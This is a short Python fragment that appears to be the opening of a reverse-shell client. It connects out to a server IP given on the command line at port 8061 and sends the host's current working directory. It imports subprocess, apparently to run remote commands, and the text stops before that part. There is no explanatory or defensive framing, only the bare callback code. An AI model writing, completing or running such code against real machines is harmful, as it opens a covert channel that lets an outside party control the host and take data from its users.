import socket
import os
import subprocess
import sys

serverIP = sys.argv[1]
serverPort = 8061
serverBuffer = 1024 * 128
seperator = '<sep>'

s = socket.socket()

s.connect((serverIP, serverPort))

cwd = os.getcwd()
s.send(cwd.encode())

